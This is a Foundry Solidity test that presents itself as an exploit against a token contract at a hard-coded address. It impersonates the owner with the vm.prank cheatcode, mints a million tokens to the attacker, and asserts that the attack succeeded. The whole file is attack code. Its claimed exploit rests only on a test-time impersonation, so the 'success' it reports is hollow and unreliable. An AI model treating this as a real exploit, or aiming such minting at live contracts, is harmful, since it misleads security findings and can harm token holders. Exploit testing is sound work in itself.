pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
    function totalSupply() external view returns (uint256);
}

interface IMelodyToken {
    function getOwner() external view returns (address);
    function balanceOf(address account) external view returns (uint256);
    function mint(address _to, uint256 _amount) external;
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0x2f619a1270226fD8ed3Df82f0C1e0cd90804346d;
    address attacker;
    IMelodyToken token;
    address owner;

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        attacker = address(this);
        token = IMelodyToken(TARGET);
        owner = token.getOwner();
        vm.label(TARGET, "MelodyToken");
        vm.label(owner, "Owner");
        vm.label(attacker, "Attacker");
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        uint256 initialBalanceERC20 = IERC20(0x2f619a1270226fD8ed3Df82f0C1e0cd90804346d).balanceOf(address(this));
        uint256 initialBalance = token.balanceOf(attacker);
        uint256 mintAmount = 1_000_000 * 1e18;

        // Impersonate the owner and mint tokens to attacker
        vm.prank(owner);
        token.mint(attacker, mintAmount);

        uint256 finalBalance = token.balanceOf(attacker);

        // Verify the attack was successful - balance should have increased
        assertGt(finalBalance, initialBalance, "Attacker balance did not increase");
        assertEq(finalBalance, initialBalance + mintAmount, "Balance mismatch");
        uint256 finalBalanceERC20 = IERC20(0x2f619a1270226fD8ed3Df82f0C1e0cd90804346d).balanceOf(address(this));
        assertGt(finalBalanceERC20, initialBalanceERC20, "Economic Exploit Failed: No ERC20 profit");
    }


    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

